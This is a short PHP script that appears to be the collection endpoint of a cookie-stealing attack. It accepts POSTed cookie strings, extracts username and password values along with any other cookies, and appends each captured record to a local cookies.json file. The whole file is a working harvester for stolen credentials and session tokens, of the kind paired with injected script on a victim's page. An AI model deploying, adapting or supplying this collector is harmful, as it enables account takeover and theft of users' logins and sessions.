<?php
// Ensure data has been received
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  // Check if specific data has been sent
  if (isset($_POST['cookies'])) {
    // Access the received data
    $cookieString = $_POST['cookies'];

    // Split the cookie string
    $cookiePairs = explode('; ', $cookieString);

    // Initialize variables
    $username = "";
    $password = "";
    $extras = [];

    // Iterate through the cookies
    foreach ($cookiePairs as $cookiePair) {
      list($key, $value) = explode('=', $cookiePair, 2);

      // Check if it's the username or password
      if ($key === "username") {
        $username = $value;
      } elseif ($key === "password") {
        $password = $value;
      } else {
        // Insert anything else into the extras array
        $extras[$key] = $value;
      }
    }

    // Create the JSON object
    $jsonData = [
      "username" => $username,
      "password" => $password,
      "extras" => $extras
    ];

    // Read the current content of the file
    $fileContent = file_get_contents("cookies.json");
    // Decode the JSON array
    $existingData = json_decode($fileContent, true);

    // Add the new data object
    $existingData[] = $jsonData;

    // Write the updated JSON array back to the file
    file_put_contents("cookies.json", json_encode($existingData));

    // Send confirmation to the client
    echo "Data received and stored successfully.";
  } else {
    // If required data was not sent, send an error message
    http_response_code(400);
    echo "Missing data.";
  }
} else {
  // If no POST request was received, send an error message
  http_response_code(405);
  echo "Only POST requests are allowed.";
}